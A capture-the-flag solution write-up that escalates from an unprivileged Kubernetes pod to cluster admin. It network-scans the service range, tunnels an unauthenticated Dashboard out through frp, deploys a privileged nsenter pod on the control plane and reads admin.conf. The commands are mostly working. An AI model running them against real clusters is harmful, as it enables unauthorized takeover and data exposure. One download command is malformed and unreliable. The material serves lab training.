# CTF Solution

Don't peek if your are still doing the CTF!

First we want to break out the Clusters. This pod is not privileged. We have found a Service Account but we don't know what to do with it. Let us see if we find something on the Network.

## get service ip

Let us start with the Service Network. For that we can check the arbitrary service kubernetes.svc.local which is available in every namespace

```bash
dig kubernetes
```

Now we are ready to scan the network of this svc. We know that it is small so let's start with /24 and some typical ports. We use `masscan` which is already installed. But you could use any network scanner:

```bash
masscan -p80,22,443 10.96.0.0/24
```

## Connect through Backtunnel and proxy

Hey we found a host running HTTP, let us check this service:

```bash
curl 10.96.0.99
```

Nice a Kubernetes Dashboard, let us connect to it using our local Brower and a bit of proxy magic

### start proxy to tunnel to web through ssh

We use a changed version of [this example](https://github.com/fatedier/frp?tab=readme-ov-file#access-your-computer-in-a-lan-network-via-ssh).

Download and untar frps on your local VM (in annother terminal)

```bash
mkdir frps
curl -s-LO https://github.com/fatedier/frp/releases/download/v0.61.0/frp_0.61.0_linux_amd64.tar.gz | tar xvz - -C ./frps
cd frps
```

Now we start a local server which the client on our hacked container can call to:

```bash
cat <<\EOF >> my-frps.toml
bindPort = 7000
EOF
./frps -c my-frps.toml
```

So now in our hacked container terminal, also download frpc if it is not available:

```bash
mkdir frps
curl -s-LO https://github.com/fatedier/frp/releases/download/v0.61.0/frp_0.61.0_linux_amd64.tar.gz | tar xvz - -C ./frps
cd frps
```

and start calling our server

```bash
cat <<\EOF >> my-frpc.toml
serverAddr = "172.18.0.1" # if unsure about the ip connecting to your server use ip route get [hacked-container-ip]
serverPort = 7000

[[proxies]]
name = "web"
type = "tcp"
localPort = 80
localIP = "10.96.0.99"
remotePort = 8181
EOF
./frpc -c my-frpc.toml # start the client
```

If you did connect directly from your local machine use type
localhost:8181 in your browser
On the VM do
curl ifconfig.me
and use this IP Address (and realize you made this service public without authentication)!

## Kube-Dashboard

Wow you could click "Skip" and authenticate with the Service Account of the Dashboard itself.
Big mistake there. Now we browse around.

Change the namespace of the ones we know:
kube-system....no luck
default....no luck
kubernetes-dashboard...bingo
We see something, even the roles!
We can exectue hosts, let go for the crown-jewels: privileged pod on the control-plane.

Create this pod:

```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: nsenter
  name: nsenter
  namespace: kubernetes-dashboard
spec:
  containers:
  - command:
    - nsenter
    - --target
    - "1"
    - --mount
    - --uts
    - --ipc
    - --net
    - --pid
    - bash
    - -l
    - -c
    - "sleep infinity"
    image: docker.io/library/alpine
    imagePullPolicy: Always
    name: nsenter
    resources:
      limits:
        cpu: 100m
        memory: 256Mi
      requests:
        cpu: 100m
        memory: 256Mi
    securityContext:
      privileged: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  hostNetwork: true
  hostPID: true
  nodeName: kind-control-plane
  tolerations:
  - key: CriticalAddonsOnly
    operator: Exists
  - effect: NoExecute
    operator: Exists
EOF
```

and exec into it:

```bash
kubectl -n kubernetes-dashboard exec -it nsenter -- /bin/bash
```

There check if we have admin access now:

```bash
mkdir /mnt/hola

kubectl --kubeconfig /etc/kubernetes/admin.conf get ns
```

We are running as cluster admin and found the flag in the namespaces :-)
